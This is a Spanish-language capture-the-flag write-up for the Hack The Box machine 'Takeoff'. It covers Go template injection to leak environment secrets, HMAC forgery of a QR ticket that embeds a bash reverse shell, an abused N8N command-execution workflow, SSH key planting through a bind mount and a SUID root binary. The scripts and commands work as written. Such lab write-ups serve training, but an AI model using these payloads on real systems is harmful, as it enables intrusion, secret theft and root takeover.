---
created: 2026-11-18
description: Takeoff es una máquina Linux que aloja un sitio web que combina una vulnerabilidad SSTI en plantillas Go con la lectura de variables de entorno para obtener la clave HMAC utilizada en la validación de códigos QR. Mediante la manipulación del QR se consigue ejecución remota de comandos y acceso inicial como `www-data`. La escalada continúa abusando de una API de N8N para ejecutar comandos como root dentro de un contenedor Docker y aprovechando un bind mount del directorio personal de un usuario para obtener acceso SSH al usuario del host y, finalmente, escalar a root mediante un binario SUID.
---
#htb #hard #linux #web #ssti #go #text-template #qr-code #env-leak #hmac #gob #secret-leak #n8n #docker #containers #bind-mount #container-escape #suid 
# Enumeración
## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/t/scan
❯ nmap -p- --open -vvv --min-rate 5000 -n -oG scan 10.129.250.248
Discovered open port 80/tcp on 10.129.250.248
Discovered open port 22/tcp on 10.129.250.248
```

Los puertos 80 y 22 están abiertos.

```bash
[hvidal@fedora] ~/d/h/h/m/t/scan
❯ nmap -p 22,80 -sCV -oN portscan.txt -Pn 10.129.250.248
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Book a Seat, See the World - HTB Airways Booking
```

## Aplicación web

El puerto 80 contiene una aplicación que gestiona los viajes de una compañía aérea.

El token de sesión contiene los siguientes datos.
```json
{
  "user_id": 2,
  "exp": 1794519127,
  "iat": 1794432727,
  "iss": "takeoff.htb"
}
```

El campo `iss` del JWT contiene el dominio `takeoff.htb`, así que lo añadí a `/etc/hosts` y continué la enumeración utilizando ese hostname.

```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ echo "10.129.250.248 takeoff.htb" | sudo tee -a /etc/hosts
```

### Generación de PDF

Al terminar el proceso de compra se genera un código QR y se permite descargar el ticket en PDF.

Lo que me llamó la atención fue la opción de añadir notas al PDF. Esta función me hizo pensar en SSTI, pero al probar con el típico payload `{{7 * 7}}` este no devolvía `49`.

Sin embargo, al utilizar el payload `{{.}}`, el PDF mostraba dos direcciones de memoria, lo que indicaba que la plantilla estaba recibiendo dos punteros como contexto.

Eso se debe a que la aplicación está creada en GO y el PDF se renderiza con `text/template`, este motor tiene algunas particularidades respecto a otros como Jinja2.

En `text/template`, `{{.}}` representa el objeto sobre el que trabaja la plantilla.

Para obtener más información del contexto usé el comando `printf`.
```go
{{printf "%#v" .}}
```

Este payload devuelve:
```go
&handlers.notesCtx{Request:(*http.Request)(0xc0000f5040), User:(*models.User)(0xc0002fa900)}
```

Lo que significa que la plantilla únicamente trabaja con un puntero a `http.Request` que contiene información sobre la request y otro a `models.User` que contiene información del usuario actual.

La función es aproximadamente así:
```go
type notesCtx struct {
    Request *http.Request
    User    *models.User
}

func renderTicket(w http.ResponseWriter, r *http.Request, user *models.User, notes string) {
    ctx := notesCtx{
        Request: r,
        User:    user,
    }

    tmpl := template.Must(
        template.New("ticket").Parse(notes),
    )

    tmpl.Execute(w, &ctx)
}
```

> La vulnerabilidad ocurre porque `Parse()` recibe un input que se interpreta como una plantilla.

Estos objetos no son muy útiles por lo que seguí enumerando y encontré un método `File`, este permitía leer archivos del servidor.

El formato del payload es:
```go
{{.File "/etc/passwd"}}
```

Esta es una función implementada en el objeto `notesCtx` (por eso se llama con `.`):
```go
func (ctx *notesCtx) File(path string) string {
    // ...
}
```

Este método no aparece en la representación obtenida con `printf "%#v"`, ya que esta muestra la estructura y los valores de sus campos, pero no enumera los métodos asociados al tipo.

Esta función no es útil por ahora así que saltaré a enumerar otras funcionalidades y luego volveré a esta función si es necesario.

### Generación de código QR

Otro elemento que me llamó la atención es el código QR.

Al abrir el código QR en el navegador en la URL aparece el código QR codificado en Base64, tras analizar su contenido descubrí que contenía una cadena en Base64. Tras decodificarla identifiqué la siguiente estructura:
- `gob.VerifyTicketAuthenticity`:  indica que utiliza el formato de serialización Gob de Go. Almacena información de Data como la longitud.
- JSON Data:
```json
{
  "PNR": "3WC2MV",
  "Token": "2d61e3f40778e49825ac0f700033e083",
  "Seat": "2C",
  "Passenger": "hugo",
  "NotifyCmd": "check-in-notify --pnr 3WC2MV --email hugo@asd.com"
}
```
- Byte de separación: 0x00
- 32 Bytes adicionales que parecen un HMAC

Estos campos se pueden visualizar con el siguiente script de Python.
>[!Info]- Decode
>```python
>#!/usr/bin/env python3
>
>import sys
>import base64
>import json
>
>
>def decode(token):
>    raw = base64.b64decode(token, validate=True)
>
>    # El bloque final tiene 32 bytes.
>    hmac = raw[-32:]
>
>    # El JSON comienza en el primer '{'.
>    json_start = raw.index(b'{')
>
>    # El separador nulo precede al HMAC.
>    separator = len(raw) - 33
>    if raw[separator] != 0:
>        raise ValueError("Separador Gob/HMAC no encontrado")
>
>    header = raw[:json_start]
>    json_data = raw[json_start:separator]
>
>    data = json.loads(json_data)
>
>    print("[+] CABECERA GOB")
>    print(f"{header}")
>
>    print("\n[+] JSON")
>    print(json.dumps(data, indent=4, ensure_ascii=False))
>
>    print("\n[+] HMAC (32 bytes)")
>    print(hmac.hex())
>
>
>if __name__ == "__main__":
>    if len(sys.argv) != 2:
>        print(f"Uso: {sys.argv[0]} <token>")
>        sys.exit(1)
>
>    decode(sys.argv[1])
>```

Me llamó la atención el campo de `NotifyCmd` ya que parece un comando, así que si pudiera modificar su contenido y consiguiera que el servidor interpretara mi propio QR podría conseguir una ejecución remota de comandos.

En la página web hay un apartado de Check In, así que interpreté su request con Burp Suite. Esta enviaba un parámetro `qr_data` codificado en Base64, que al decodificarlo devolvía el contenido del QR. Este es el endpoint que interpreta el QR.

El problema es que para modificar el código necesitamos la clave usada para generar el HMAC-SHA256.

# Acceso inicial

## SSTI

El token que genera el HMAC está almacenado en una variable de entorno, que se puede encontrar leyendo el archivo `//proc/self/environ` mediante el SSTI en la generación del PDF con el siguiente payload:
```go
{{.File "//proc/self/environ"}}
```

Este payload devuelve el token y una API Key de N8N que conviene recordar para más adelante.
```txt
TICKET_VALIDATION_TOKEN=<HMAC_KEY>
N8N_API_KEY=<KEY>
```

## Manipulación del código QR

El problema es que si queremos modificar Data habría que actualizar Gob header si la longitud cambia. Yo me ahorraré ese paso reutilizando el header del código original y modificando otros campos de Data como `Passenger` para mantener la misma longitud. Para ello creé un script en Python.

>[!info]- Encode
>```python
>#!/usr/bin/env python3
>
>import sys
>import json
>import base64
>import hmac
>import hashlib
>
>KEY=b"<HMAC_KEY>"
>
>def encode(token, json_file):
>    raw = base64.b64decode(token, validate=True)
>
>    json_start = raw.index(b'{')
>    separator = len(raw) - 33
>
>    if raw[separator] != 0:
>        raise ValueError("Separador no encontrado")
>
>    header = raw[:json_start]
>    original_json = raw[json_start:separator]
>
>    with open(json_file, "r", encoding="utf-8") as f:
>        data = json.load(f)
>
>    new_json = json.dumps(
>        data,
>        ensure_ascii=False,
>        separators=(",", ":")
>    ).encode("utf-8")
>
>    if len(new_json) != len(original_json):
>        print(f"Longitud diferente: original={len(original_json)} nuevo={len(new_json)}")
>        exit(1)
>
>    # Reconstruir los datos que se van a firmar.
>    payload = header + new_json + b"\x00"
>
>    # Calcular el HMAC del contenido modificado.
>    signature = hmac.new(
>        KEY,
>        payload,
>        hashlib.sha256
>    ).digest()
>
>    # Reconstruir el token completo.
>    result = payload + signature
>
>    print(base64.b64encode(result).decode())
>
>if __name__ == "__main__":
>    if len(sys.argv) != 3:
>        print(f"Uso: {sys.argv[0]} <token_original> <modified_json_file>")
>        sys.exit(1)
>
>    encode(sys.argv[1], sys.argv[2])
>```

Para usar este script hay que crear un archivo `modified.json` con la sección Data modificada pero manteniendo la longitud, el campo `Token` y `PNR` del código original.

Yo usé una reverse shell en Bash en el campo `NotifyCmd` y alargué el campo `Passenger`.

```json
{
    "PNR": "<PNR>",
    "Token": "<Token>",
    "Seat": "2B",
    "Passenger": "hugooooaaaaa",
    "NotifyCmd": "bash -i >& /dev/tcp/IP/4444 0>&1"
}
```

Luego generamos el código.
```bash
[hvidal@fedora] ~/d/h/h/m/t/c/token
❯ python encode.py $(cat org_code.b64) modified.json
```

Escuchamos en el puerto `4444`.
```bash
[hvidal@fedora] ~/d/h/h/m/t/c/token
❯ nc -nlvp 4444
```

Enviamos el nuevo código al servidor.
```http
POST /api/check-in HTTP/1.1
Host: takeoff.htb
Content-Length: 401
Content-Type: application/x-www-form-urlencoded
Cookie: session_token=<JWT>

qr_data=<Nuevo_codigo_URL-encodeado>&gate=WEB
```

De esta forma conseguimos una shell como `www-data`.
```bash
www-data@takeoff:/opt/htb-airways/booking$
```

# Post-explotación

## Enumeración

Lo primero que hice fue comprobar los servicios internos que hay corriendo:
```bash
www-data@takeoff:/opt/htb-airways/booking$ ss -tunlp
tcp 127.0.0.1:3000   users:(("htb-air",pid=1750,fd=6)) 
tcp 0.0.0.0:80       users:(("nginx",pid=1312,fd=5),("nginx",pid=1310,fd=5))
tcp 127.0.0.1:3306
tcp 127.0.0.1:5678
```

Entre los servicios encontrados, el puerto `5678` llamó especialmente mi atención, ya que alojaba una aplicación web diferente. Por otro lado, el puerto `3306` correspondía a un servicio que no utiliza HTTP. Los puertos `80` y `3000` contienen la página web que ya conocemos.

Para identificar los procesos asociados a estos puertos, enumeré los procesos activos del sistema.
```bash
www-data@takeoff:/opt/htb-airways/booking$ ps aux
root /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5678 -container-ip 172.18.0.2 -container-port 5678 -use-listen-fd
root /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3306 -container-ip 172.18.0.3 -container-port 3306 -use-listen-fd
root node /usr/local/bin/n8n
```

Los procesos muestran que hay dos contenedores de docker y N8N está corriendo como root en el puerto `5678`.

Luego listé los workflows de N8N usando la API Key de las variables de entorno.
```bash
www-data@takeoff:/opt/htb-airways/booking$ curl -H "X-N8N-API-KEY: $N8N_API_KEY" "localhost:5678/api/v1/workflows"
```

## Abuso de N8N

Los workflows existentes realizaban consultas a una base de datos MySQL, pero estaban desactivados. Como no disponía de las credenciales necesarias para activarlos, decidí crear un workflow propio que permitiera ejecutar comandos en el contenedor.

```json
{
  "name": "Command Executor",
  "nodes": [
    {
      "parameters": {
        "httpMethod": "POST",
        "path": "command",
        "responseMode": "lastNode",
        "options": {}
      },
      "id": "webhook-001",
      "name": "Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 2.1,
      "position": [0, 0]
    },
    {
      "parameters": {
        "command": "={{ $json.body.command }}"
      },
      "id": "execute-001",
      "name": "Execute Command",
      "type": "n8n-nodes-base.executeCommand",
      "typeVersion": 1,
      "position": [240, 0]
    }
  ],
  "connections": {
    "Webhook": {
      "main": [
        [
          {
            "node": "Execute Command",
            "type": "main",
            "index": 0
          }
        ]
      ]
    }
  },
  "settings": {}
}
```

Este workflow se activa con una petición por POST a un webhook en la ruta `command`, este activa un nodo que permite ejecutar el comando recuperado del parámetro `command` en el body de la petición.

![[my_workflow.png]]

Primero montamos un servidor HTTP en nuestra máquina para poder acceder al workflow.
```bash
[hvidal@fedora] ~/d/h/h/m/t/c/n8n
❯ python -m http.server 8000
```

Luego descargamos el workflow.
```bash
www-data@takeoff:/tmp$ curl http://IP:8000/payload.json -o payload.json
```

Creamos el workflow en N8N.
```bash
www-data@takeoff:/tmp$ curl -X POST "localhost:5678/api/v1/workflows" -H "X-N8N-API-KEY: $N8N_API_KEY" -H "Content-Type: application/json" --data @payload.json
```

Esto devolverá el workflow en JSON, de ese output sacaremos el id del workflow para activarlo.
```bash
www-data@takeoff:/tmp$ curl -X POST -H "X-N8N-API-KEY: $N8N_API_KEY" "localhost:5678/api/v1/workflows/<ID>/activate"
```

Ahora podemos ejecutar comandos en el contenedor mediante una petición POST al webhook.
```bash
www-data@takeoff:/tmp$ curl -X POST http://localhost:5678/webhook/command -H "Content-Type: application/json" -d '{"command":"id"}'
{"exitCode":0,"stderr":"","stdout":"uid=0(root) gid=0(root) groups=0(root)"}
```

No conseguí establecer una reverse shell desde el contenedor, así que continué realizando la enumeración y ejecutando comandos a través del webhook.

# Escalada de privilegios

## Enumeración del contenedor

Al leer el contenido de la carpeta `/root` me pareció raro encontrar la user flag y diferentes archivos propiedad del UID `1001`.
```bash
# A través del webhook
ls -l /root
-rw-r--r--    1 1001  1001  3526 Apr 20  2026 .bashrc
drwxr-xr-x    3 1001  1001  4096 Apr 23  2026 .cache
drwxr-xr-x    4 root  root  4096 Nov 19 10:26 .n8n
-rw-r--r--    1 1001  1001   807 Apr 20  2026 .profile
-rw-r-----    1 root  1001    33 Nov 19 10:25 user.txt
```

Esto me hizo pensar que la carpeta `/root` estaba montada en una carpeta del `/home` del host. Así que enumeré los usuarios del host buscando cuál es el `1001`.
```bash
www-data@takeoff:/tmp$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
kpark:x:1001:1001::/home/kpark:/bin/bash
vmiller:x:1000:1000::/home/vmiller:/bin/bash
```

Al ver que el usuario `1001` es `kpark`, probé añadiendo mi clave SSH en `authorized_keys`.
```bash
# A través del webhook
mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo \"<SSH key>\" > /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && chown -R 1001:1001 /root/.ssh
```

Esto me permitió conectarme por SSH al usuario `kpark` en el host.
```bash
[hvidal@fedora] ~/.ssh
❯ ssh -i id_ed25519 kpark@takeoff.htb
kpark@takeoff:~$
```

Ahora podemos leer la user flag.
```bash
kpark@takeoff:~$ cat user.txt
```

## Explotación del bind mount

Al listar los archivos de `/home/kpark` me di cuenta de que los archivos que eran propiedad de `root` en el contenedor también lo eran en la máquina host. 

Para explotar este acceso al sistema de archivos del host, crearé un binario SUID que permita obtener una shell con privilegios de root. Utilizaré un programa en C en lugar de un script, ya que Linux ignora el bit SUID en los scripts interpretados.

Primero hice el código en C.
```c
#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 1;
}
```

Compilé el código.
```bash
[hvidal@fedora] ~/d/h/h/m/t/c/privesc
❯ gcc main.c -o payload
```

Lancé un servidor HTTP para descargar el binario.
```bash
[hvidal@fedora] ~/d/h/h/m/t/c/privesc
❯ python -m http.server 8000
```

Luego hay que descargarlo desde el host.
```bash
kpark@takeoff:~$ curl -o payload http://IP:8000/payload
```

Cambiar la propiedad a `root` y otorgarle permisos SUID desde el contenedor.
```bash
# A través del webhook
chown root:root /root/payload && chmod 4755 /root/payload
```

Ahora `kpark` debería ver que el payload pertenece a `root` y tiene permisos SUID
```bash
kpark@takeoff:~$ ls -l
-rwsr-xr-x 1 root root  12624 Nov 19 04:48 payload
```

Al ejecutarlo tenemos una shell como `root`.
```bash
kpark@takeoff:~$ ./payload 
root@takeoff:~$
```

Leer la root flag.
```bash
root@takeoff:~$ cat /root/root.txt
```